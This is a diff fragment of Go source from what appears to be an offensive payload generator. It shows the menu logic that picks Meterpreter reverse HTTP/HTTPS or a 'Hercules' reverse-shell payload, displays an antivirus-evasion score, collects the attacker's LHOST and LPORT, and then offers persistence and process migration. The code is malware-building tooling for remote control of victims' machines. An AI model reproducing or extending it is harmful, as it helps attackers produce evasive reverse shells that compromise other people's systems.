+    Payload.Size = "4.2 MB"
+    Payload.UPX_Size = "1.1 KB"
+    Payload.Score = 10
+    Payload.SourceCode = METERPRETER_HTTP_HTTPS
+
+    ClearScreen()
+    PrintBanner()
+
+    BoldBlue.Println("#====================================================================================#")
+    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
+    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
+    BoldBlue.Print("# Meterpreter Reverse HTTP                   | 4.2 MB / 1.1 MB  |       ")
+    BoldGreen.Print("10/10        ")
+    BoldBlue.Println("#")
+    BoldBlue.Println("#====================================================================================#")
+
+    for  ;;  {
+      var IP string
+      fmt.Print("\n\n[*] Enter LHOST : ")
+      fmt.Scan(&IP)
+      if (len(IP) < 7) || (len(IP) > 15) {
+        Warning.Println("\n\n[!] ERROR : Invalid ip")
+      }else{
+        Payload.Ip = IP
+        break
+      }
+
+    }
+
+    for  ;;  {
+      var PORT string
+      fmt.Print("\n[*] Enter LPORT : ")
+      fmt.Scan(&PORT)
+      _, err := strconv.Atoi(PORT)
+      if err == nil {
+        Payload.Port = PORT
+        break
+      }
+      Warning.Println("\n\n[!] ERROR : Invalid port")
+
+    }
+
+
+    AskPersistence()
+    AskMigrate()
+
+
+   }else if No == 3 {
+    Payload.Type = 3
+    Payload.Size = "4.2 MB"
+    Payload.Score = 10
+    Payload.SourceCode = METERPRETER_HTTP_HTTPS
+
+    ClearScreen()
+    PrintBanner()
+
+    BoldBlue.Println("#====================================================================================#")
+    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
+    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
+    BoldBlue.Print("# Meterpreter Reverse HTTPS                  | 4.2 MB / 1.1 MB  |       ")
+    BoldGreen.Print("10/10        ")
+    BoldBlue.Println("#")
+    BoldBlue.Println("#====================================================================================#")
+
+    for  ;;  {
+      var IP string
+      fmt.Print("\n\n[*] Enter LHOST : ")
+      fmt.Scan(&IP)
+      if (len(IP) < 7) || (len(IP) > 15) {
+        Warning.Println("\n\n[!] ERROR : Invalid ip")
+      }else{
+        Payload.Ip = IP
+        break
+      }
+
+    }
+
+    for  ;;  {
+      var PORT string
+      fmt.Print("\n[*] Enter LPORT : ")
+      fmt.Scan(&PORT)
+      _, err := strconv.Atoi(PORT)
+      if err == nil {
+        Payload.Port = PORT
+        break
+      }
+      Warning.Println("\n\n[!] ERROR : Invalid port")
+
+    }
+
+    AskPersistence()
+    AskMigrate()
+
+
+
+  }else if No == 4 {
+    Payload.Type = 4
+    Payload.Size = "4.4 MB"
+    Payload.Score = 9
+    Payload.SourceCode = HERCULES_REVERSE_SHELL
+
+    ClearScreen()
+    PrintBanner()
+
+    BoldBlue.Println("#====================================================================================#")
+    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
+    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
+    BoldBlue.Print("# HERCULES REVERSE SHELL                     | 4.4 MB / 1.1 MB  |        ")
+    BoldGreen.Print("9/10        ")
+    BoldBlue.Println("#")
+    BoldBlue.Println("#====================================================================================#")
+
+    for  ;;  {
+      var IP string
+      fmt.Print("\n\n[*] Enter LHOST : ")
+      fmt.Scan(&IP)
+      if (len(IP) < 7) || (len(IP) > 15) {
+        Warning.Println("\n\n[!] ERROR : Invalid ip")
+      }else{
+        Payload.Ip = IP
+        break
+      }
+
+    }
+
+    for  ;;  {
+      var PORT string
+      fmt.Print("\n[*] Enter LPORT : ")
+      fmt.Scan(&PORT)
+      _, err := strconv.Atoi(PORT)
+      if err == nil {
+        Payload.Port = PORT
+        break
+      }
+      Warning.Println("\n\n[!] ERROR : Invalid port")
+
+    }
+
+
+
+  }else {
+
+    ClearScreen()
+    PrintBanner()
+    PrintPayloads()
+
+    Warning.Println("\n[!] ERROR : Invalid choise\n")
+
+    fmt.Print("\n\n[*] Select : ")
+    fmt.Scan(&NO)
+
+    PreparePayload(NO)
+
+  }
+
 }
